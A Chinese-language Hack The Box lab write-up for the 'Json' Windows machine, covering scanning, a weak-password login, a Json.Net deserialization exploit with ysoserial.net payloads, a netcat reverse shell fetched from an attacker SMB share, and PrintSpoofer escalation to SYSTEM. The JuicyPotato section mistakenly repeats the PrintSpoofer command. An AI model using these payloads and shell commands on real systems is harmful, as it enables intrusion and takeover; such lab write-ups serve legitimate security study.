---
title: HTB-Json Writeup
date: 2026-03-01T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Windows
  - Writeup
  - HTB
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.227.191 -oA port
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:13 EST
Nmap scan report for 10.129.227.191
Host is up (0.10s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ grep open port.nmap | awk -F '/' '{print $1}' | paste -sd ','
21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158
```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158 10.129.227.191                      

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 01:17 EST
Nmap scan report for 10.129.227.191
Host is up (0.097s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Json HTB
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or 2012 R2
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:8d:d4 (VMware)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-03-01T06:18:26
|_  start_date: 2026-03-01T06:05:01

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds
```

### Nmap 漏洞脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=vuln -p21,80,135,139,445,5985,47001,49152,49153,49154,49155,49156,49157,49158 10.129.227.191
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 21:35 EST
Nmap scan report for json.htb (10.129.227.191)
Host is up (0.12s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /login.html: Possible admin folder
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: No accounts left to try

Nmap done: 1 IP address (1 host up) scanned in 482.23 seconds
```

对 `hosts` 文件添加域解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo sed -i '1i 10.129.227.191 json.htb' /etc/hosts 
                           
┌──(kali㉿kali)-[~/Work/Kali]
└─$ head -n 1 /etc/hosts
10.129.227.191 json.htb
```

## 21-ftp 渗透

Nmap 扫描出开放了 21/ftp 端口，尝试匿名登入。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ftp json.htb
Trying 10.129.227.191:21 ...
Connected to json.htb.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (json.htb:kali): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> ls
530 Please log in with USER and PASS first.
530 Please log in with USER and PASS first.
ftp: Can't bind for data connection: Address already in use
```

无法匿名登入，ftp 使用的是 `FileZilla`，搜索一下有没有公开的漏洞利用。

```bash
──(kali㉿kali)-[~/Work/Kali]
└─$ searchsploit FileZilla 0.9                         
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
FileZilla FTP Server 0.9.20b/0.9.21 - 'STOR' Denial of Service                                          | windows/dos/2901.php
FileZilla FTP Server 0.9.21 - 'LIST/NLST' Denial of Service                                             | windows/dos/2914.php
FileZilla Server Terminal 0.9.4d - Buffer Overflow (PoC)                                                | windows/dos/1336.cpp
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

都是 Dos 漏洞，无法利用。

## 445-Smb 渗透

使用 `smbmap` 匿名枚举失败

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ smbmap -H json.htb         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Something weird happened on (10.129.227.191) Error occurs while reading from remote(104) on line 1015                    
[*] Closed 1 connections
```

使用 `enum4linux` 进行进一步的枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ enum4linux-ng -A json.htb
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... json.htb
[*] Username ......... ''
[*] Random Username .. 'cfxfhmar'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =================================
|    Listener Scan on json.htb    |
 =================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =======================================================
|    NetBIOS Names and Workgroup/Domain for json.htb    |
 =======================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- JSON            <00> -         B <ACTIVE>  Workstation Service
- JSON            <20> -         B <ACTIVE>  File Server Service
- MAC Address = 00-50-56-B9-D4-5B

 =====================================
|    SMB Dialect Check on json.htb    |
 =====================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: false
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =======================================================
|    Domain Information via SMB session for json.htb    |
 =======================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: JSON
NetBIOS domain name: ''
DNS domain: json
FQDN: json
Derived membership: workgroup member
Derived domain: unknown

 =====================================
|    RPC Session Check on json.htb    |
 =====================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ===========================================
|    OS Information via RPC for json.htb    |
 ===========================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows Server 2012 R2 Datacenter 9600
OS version: '6.3'
OS release: ''
OS build: '9600'
Native OS: Windows Server 2012 R2 Datacenter 9600
Native LAN manager: Windows Server 2012 R2 Datacenter 6.3
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 11.72 seconds
```

`json.htb` 属于 `WORKGROUP` 工作组，`NetBIOS` 的名称为 `JSON`，在 445/tcp 和 139/tcp 端口上分别开启了 SMB 和 NetBIOS 服务，主机支持多种 SMB 协议，首选协议为 SMB 3.0，未禁用 SMB 1.0，可能可以利用旧版 SMB 漏洞，确认目标操作系统为 `Windows Server 2012 R2 Datacenter`。

在连接 LDAP 和 LDAPS 端口时，389/tcp、636/tcp 端口均拒绝服务，这表明这些服务未开启或被防火墙阻止，Nmap 也没法发现开放。在尝试通过会话或随即用户进行访问 RPC 连接时，均因为权限不足而失败，目标主机对未认证用户的访问控制较为严格。

## Web-80 端口渗透

打开 Web-80 界面是一个登入框。

![](Pasted%20image%2020260302110209.png)

使用弱密码 `admin:admin` 成功进入后台。

![](Pasted%20image%2020260302110414.png)

在底部的 `Development Approach` 处写道这个后台管理系统可能是 `SB Admin 2`。

![](Pasted%20image%2020260302110511.png)

查看源码进一步验证了这个后台管理系统是 `SB amin 2`。

![](Pasted%20image%2020260302110712.png)

继续翻阅源码，查看 `js/app.min.js`，发现它包含自定义逻辑。

```app.min.js
var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = { UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": _0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4]); window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }])
```

发现源码被混淆了，使用 AI 工具解混淆。

```bash
// 定义一个名为 "json" 的 AngularJS 模块，依赖 ngCookies
angular.module("json", ["ngCookies"])

// 登录控制器
.controller("loginController", ["$http", "$scope", "$cookies", 
    function ($http, $scope, $cookies) {
        // 初始化登录凭证
        $scope.credentials = { 
            UserName: "", 
            Password: "" 
        };
        
        // 初始化错误信息
        $scope.error = { 
            message: "", 
            show: false 
        };
        
        // 检查是否已有 OAuth2 token
        var token = $cookies.get("OAuth2");
        if (token) { 
            // 如果已登录，重定向到首页
            window.location.href = "index.html";
        }
        
        // 登录函数
        $scope.login = function () {
            // POST 请求到 /api/token 端点
            $http.post("/api/token", $scope.credentials)
                .then(
                    function (response) {
                        // 登录成功，跳转到首页
                        window.location.href = "index.html";
                    }, 
                    function (error) {
                        // 登录失败，显示错误信息
                        $scope.error.message = "Invalid Credentials.";
                        $scope.error.show = true;
                        console.log(error);
                    }
                );
        };
    }
])

// 主控制器
.controller("principalController", ["$http", "$scope", "$cookies", 
    function ($http, $scope, $cookies) {
        // 获取 OAuth2 token
        var token = $cookies.get("OAuth2");
        
        if (token) {
            // 使用 token 获取用户信息
            $http.get("/api/Account/", { 
                headers: { 
                    "Bearer": token 
                } 
            })
            .then(
                function (response) {
                    // 设置用户名
                    $scope.UserName = response.data.Name;
                }, 
                function (error) {
                    // Token 无效，删除并重定向到登录页
                    $cookies.remove("OAuth2");
                    window.location.href = "login.html";
                }
            );
        } else {
            // 没有 token，重定向到登录页
            window.location.href = "login.html";
        }
    }
]);

```

定义了两个控制器 `loginController` 和 `principalController` 用于处理登录和验证功能。

在登录界面随便输入账号密码，使用 burpsuite 抓包观察。

![](Pasted%20image%2020260302112209.png)

发送至 Repeater，重放查看结果。

![](Pasted%20image%2020260302112321.png)

根据前面解混淆的 js 源码，将方法改为 GET，传输至  `/api/Account`，随便给个 `Bearer`。

![](Pasted%20image%2020260302113001.png)
如果将 Bearer 的长度缩短则会报错 `Cannot deserialize Json.Net Object`，说明此处用 Json.net Object 做反序列化。由于 Bearer 给的值是明文 `enil`，所以不能反序列化，需要将 Bearer 字段调整为同程序大小一致。

![](Pasted%20image%2020260302143248.png)

以上内容表明技术栈为 ASP.NET，并且使用的是 Json.net 库处理 JSON 数据，使用 ysoserial.net 生成 payload。

使用 ping 命令做简化的 payload，验证是否存在反序列化漏洞。

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -c "ping -n 10 10.10.16.155" -o base64 -g ObjectDataProvider -f Json.Net
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMTAgMTAuMTAuMTYuMTU1J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0=
```

在 kali 中使用 tshark 监控流量，再将生成的 payload 给到 Bearer，重放。

![](Pasted%20image%2020260302145914.png)

kali 捕捉到了 ping 的访问，证明反序列化是存在漏洞的，在 kali 中准备好 nc，使用 smbserber 远程执行。

```bash
┌──(kali㉿kali)-[~/Work]
└─$ ls -liah nc64.exe 
2551692 -rwxrwxrwx 1 kali kali 54K Dec 15 00:40 nc64.exe
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work]
└─$ sudo impacket-smbserver Enil . -smb2support
[sudo] password for kali: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

进一步生成 payload。

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -c "START /B \\10.10.16.155\Enil\nc64.exe 10.10.16.155 443 -e cmd.exe" -o base64 -g ObjectDataProvider -f Json.Net
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFNUQVJUIC9CIFxcXFwxMC4xMC4xNi4xNTVcXEVuaWxcXG5jNjQuZXhlIDEwLjEwLjE2LjE1NSA0NDMgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
```

- -c：表示 `command`，指定执行的系统命令
- START /B：启动新进程，在 Windows 上后台运行，不打开新窗口。这里是执行一个后台任务
- -o：指定输出的格式
- -g：表示使用的 gadget，它们在反序列化过程中可以被利用来执行任意代码。`ObjectDataProvider` 是此处指定的 gadget 类型，是 WPF 框架中的一个类，常用于执行命令注入。
- -f：指定序列化框架

启动监听，将 payload 填入 Bearer，重放。得到一个 cmd 的回显。

```bash
┌──(kali㉿kali)-[~/Work/Kali/CVE-2015-1635-POC]
└─$ sudo rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.155] from (UNKNOWN) [10.129.227.191] 50626
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>hostname
hostname
json
```

查看 systeminfo。

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          3/1/2026, 8:27:41 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 7,535 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,808 MB
Virtual Memory: In Use:    663 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.227.191
                                 [02]: fe80::f19f:1378:66b2:439f
                                 [03]: dead:beef::f19f:1378:66b2:439f
                                 [04]: dead:beef::4f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## 提权枚举

查看当前用户权限。

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

有 SeImpersonatePrivilege 权限，可以考虑烂土豆提权。也可以使用 PrintSpoofer 提权。

将 PrintSpoofer 传进靶机。

```bash
c:\windows\system32\inetsrv>cd c:\programdata
cd c:\programdata

c:\ProgramData>mkdir apps
mkdir apps

c:\ProgramData>cd apps
cd apps

c:\ProgramData\apps>copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:00 AM    <DIR>          .
03/02/2026  03:00 AM    <DIR>          ..
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               2 Dir(s)   4,617,351,168 bytes free
```

尝试执行提权。

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## 其他提权思路

### 土豆提权

将 JuicyPotato.exe 传入靶机。

```bash
c:\ProgramData\apps>copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:40 AM    <DIR>          .
03/02/2026  03:40 AM    <DIR>          ..
12/06/2021  06:35 PM           347,648 JuicyPotato.exe
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               2 File(s)        374,784 bytes
               2 Dir(s)   4,617,109,504 bytes free
```

利用提权。

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```